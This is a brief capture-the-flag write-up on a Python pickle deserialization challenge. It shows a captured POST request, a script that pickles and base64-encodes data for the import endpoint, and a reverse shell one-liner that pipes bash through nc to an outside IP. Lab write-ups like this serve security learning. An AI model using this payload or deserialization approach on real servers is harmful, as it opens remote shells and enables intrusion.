# python string attack
hint: deserialization

# obtain post request format
- In Chrome, press f12 to see post/get requests sent.
the post sent when using api/import
```http
POST /api/import HTTP/1.1
Host: ctf.adl.tw:12004
Content-Length: 17
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/json
Origin: http://ctf.adl.tw:12004
Referer: http://ctf.adl.tw:12004/
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: fukuwarai_sess=d0efc493-36d5-4824-8700-a979fa57e739
Connection: close

{"layout":"1322"}
```
# sending a normal request
1. test post param:
```py
import pickle
import requests
import base64

url = 'http://ctf.adl.tw:12004/api/import'
my_layout = [
    {'id': 'ninja', 'left': 350, 'top': 180},
    {'id': 'pizza', 'left': 442, 'top': 275},
    
]
my_layout=pickle.dumps(my_layout)
my_layout=base64.b64encode(my_layout)
my_layout=str(my_layout,'utf-8')
print(my_layout)#gASVQAAAAAAAAABdlCh9lCiMAmlklIwFbmluamGUjARsZWZ0lE1eAYwDdG9wlEu0dX2UKGgCjAVwaXp6YZRoBE26AWgFTRMBdWUu
myobj={'layout':my_layout}

r = requests.post(url, json = myobj)
pass
#
```

2. reverse shell payload
```sh
mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
```

